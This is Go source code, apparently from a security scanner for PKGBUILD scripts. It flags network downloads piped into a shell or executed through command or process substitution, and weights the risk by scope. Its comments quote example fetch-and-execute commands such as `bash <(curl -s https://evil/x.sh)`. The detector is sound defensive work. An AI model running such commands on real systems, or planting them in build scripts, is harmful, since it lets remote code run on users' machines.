package pkgbuild

import (
	"mvdan.cc/sh/v3/syntax"
)

func checkBinaryCmd(binCmd *syntax.BinaryCmd, scope string, triggers *[]ThreatTrigger) {
	if binCmd.Op != syntax.Pipe && binCmd.Op != syntax.PipeAll {
		return
	}

	line := int(binCmd.Pos().Line())
	stages := collectPipelineStages(binCmd)
	if len(stages) < 2 {
		return
	}

	netToolFound := false
	pipedToShell := false

	for i, stage := range stages {
		cmd, _ := getCallCommand(stage)
		if isNetworkTool(cmd) {
			netToolFound = true
		}
		if netToolFound && i > 0 && isShell(cmd) {
			pipedToShell = true
			break
		}
	}

	if pipedToShell {
		*triggers = append(*triggers, ThreatTrigger{
			Category:    CategoryRemoteExecution,
			Name:        "pipe_network_to_shell",
			Description: "Pipeline piping network download tool into shell interpreter",
			ScoreWeight: 45,
			Line:        line,
			Scope:       scope,
		})

		appendScopeNetworkExecution(scope, line, triggers)
	}
}

// appendScopeNetworkExecution adds the scope-escalation trigger shared by every
// "network download executed as code" detection (pipe-to-shell, command
// substitution, and process substitution). Downloading and executing remote
// content during root-scope sourcing or an install scriptlet is the highest
// risk; inside a build function it is still a full remote-execution path.
func appendScopeNetworkExecution(scope string, line int, triggers *[]ThreatTrigger) {
	switch scope {
	case ScopeRoot:
		*triggers = append(*triggers, ThreatTrigger{
			Category:    CategoryRemoteExecution,
			Name:        "root_scope_network_execution",
			Description: "Network download and execution during PKGBUILD root-scope sourcing",
			ScoreWeight: 45,
			Line:        line,
			Scope:       scope,
		})
	case ScopeFunction:
		*triggers = append(*triggers, ThreatTrigger{
			Category:    CategoryRemoteExecution,
			Name:        "function_network_execution",
			Description: "Network download and execution inside function scope",
			ScoreWeight: 40,
			Line:        line,
			Scope:       scope,
		})
	case ScopeInstallScriptlet:
		*triggers = append(*triggers, ThreatTrigger{
			Category:    CategoryRemoteExecution,
			Name:        "install_scriptlet_network_execution",
			Description: "Network download and execution inside install scriptlet",
			ScoreWeight: 45,
			Line:        line,
			Scope:       scope,
		})
	}
}

func collectPipelineStages(node syntax.Node) []*syntax.CallExpr {
	var stages []*syntax.CallExpr
	var walkStages func(n syntax.Node)
	walkStages = func(n syntax.Node) {
		switch cmd := n.(type) {
		case *syntax.BinaryCmd:
			if cmd.Op == syntax.Pipe || cmd.Op == syntax.PipeAll {
				walkStages(cmd.X)
				walkStages(cmd.Y)
				return
			}
		case *syntax.Stmt:
			walkStages(cmd.Cmd)
			return
		case *syntax.Subshell:
			for _, s := range cmd.Stmts {
				walkStages(s)
			}
			return
		case *syntax.CallExpr:
			stages = append(stages, cmd)
			return
		}
	}
	walkStages(node)
	return stages
}

func hasNetworkTool(node syntax.Node) bool {
	foundNet := false
	syntax.Walk(node, func(n syntax.Node) bool {
		if n == nil {
			return false
		}
		if call, ok := n.(*syntax.CallExpr); ok {
			cmd, _ := getCallCommand(call)
			if isNetworkTool(cmd) {
				foundNet = true
				return false
			}
		}
		return true
	})
	return foundNet
}

func checkCmdSubst(subst *syntax.CmdSubst, ancestors []syntax.Node, scope string, triggers *[]ThreatTrigger) {
	if !cmdSubstOutputExecuted(ancestors) || !hasNetworkTool(subst) {
		return
	}
	line := int(subst.Pos().Line())
	*triggers = append(*triggers, ThreatTrigger{
		Category:    CategoryRemoteExecution,
		Name:        "cmdsubst_network_download",
		Description: "Command substitution executing network download",
		ScoreWeight: 45,
		Line:        line,
		Scope:       scope,
	})
	appendScopeNetworkExecution(scope, line, triggers)
}

// checkProcSubst flags Bash process substitution that feeds a network download
// into an interpreter, e.g. `bash <(curl -s https://evil/x.sh)`. This is a
// distinct evasion from command substitution: the download's output is exposed
// as a /dev/fd path argument rather than captured stdout, so the cmdsubst rules
// never see it.
func checkProcSubst(ps *syntax.ProcSubst, ancestors []syntax.Node, scope string, triggers *[]ThreatTrigger) {
	if ps == nil || ps.Op != syntax.CmdIn || !procSubstOutputExecuted(ancestors) || !hasNetworkTool(ps) {
		return
	}
	line := int(ps.Pos().Line())
	*triggers = append(*triggers, ThreatTrigger{
		Category:    CategoryRemoteExecution,
		Name:        "procsubst_network_execution",
		Description: "Process substitution feeding network download into interpreter",
		ScoreWeight: 45,
		Line:        line,
		Scope:       scope,
	})
	appendScopeNetworkExecution(scope, line, triggers)
}

// procSubstOutputExecuted reports whether the process substitution's output is
// passed to a shell interpreter, `source`, or `eval` as an argument.
func procSubstOutputExecuted(ancestors []syntax.Node) bool {
	for i := len(ancestors) - 1; i >= 0; i-- {
		if call, ok := ancestors[i].(*syntax.CallExpr); ok {
			cmd, _ := getCallCommand(call)
			return isShell(cmd) || cmd == "source" || cmd == "." || cmd == "eval"
		}
	}
	return false
}

func cmdSubstOutputExecuted(ancestors []syntax.Node) bool {
	word, call, stmt := findAncestorsContext(ancestors)
	if word == nil || call == nil || len(call.Args) == 0 {
		return false
	}
	cmd, _ := getCallCommand(call)
	if cmd == "eval" || call.Args[0] == word {
		return true
	}
	// Interpreter invoked with the download as an argument, e.g.
	// `bash -c "$(curl ...)"`, `sh "$(curl ...)"`, or `source "$(curl ...)"`.
	if isShell(cmd) || cmd == "source" || cmd == "." {
		return true
	}
	if stmt == nil {
		return false
	}
	return isPipedToLaterShell(stmt, call)
}

func findAncestorsContext(ancestors []syntax.Node) (*syntax.Word, *syntax.CallExpr, *syntax.Stmt) {
	var word *syntax.Word
	var call *syntax.CallExpr
	var stmt *syntax.Stmt
	for i := len(ancestors) - 1; i >= 0; i-- {
		switch n := ancestors[i].(type) {
		case *syntax.Word:
			if word == nil {
				word = n
			}
		case *syntax.CallExpr:
			if call == nil {
				call = n
			}
		case *syntax.Stmt:
			if stmt == nil {
				stmt = n
			}
		}
	}
	return word, call, stmt
}

func isPipedToLaterShell(stmt *syntax.Stmt, targetCall *syntax.CallExpr) bool {
	stages := collectPipelineStages(stmt)
	for i, stage := range stages {
		if stage != targetCall {
			continue
		}
		for _, later := range stages[i+1:] {
			name, _ := getCallCommand(later)
			if isShell(name) {
				return true
			}
		}
	}
	return false
}
